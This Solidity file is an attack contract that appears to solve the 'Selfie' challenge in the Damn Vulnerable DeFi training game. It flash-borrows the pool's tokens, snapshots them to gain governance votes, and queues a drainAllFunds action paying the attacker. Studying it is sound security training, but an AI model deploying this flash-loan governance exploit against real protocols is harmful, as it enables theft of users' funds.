// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract AttackContract {
    address public attacker;
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;
    uint256 public poolTokens;

    constructor(
        address attackerAddr,
        address selfiePoolAddr,
        address simpleGovernanceAddr,
        address tokenAddr
    ) {
        attacker = attackerAddr;
        selfiePool = SelfiePool(selfiePoolAddr);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddr);
        token = DamnValuableTokenSnapshot(tokenAddr);
    }

    function callFlashLoan() public {
        poolTokens = token.balanceOf(address(selfiePool));
        selfiePool.flashLoan(poolTokens);
    }

    function receiveTokens(address tokenAddr, uint256 borrowAmount) public {
        token.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        token.transfer(address(selfiePool), poolTokens);
    }

    function executeAction() public {
        simpleGovernance.executeAction(actionId);
    }
}
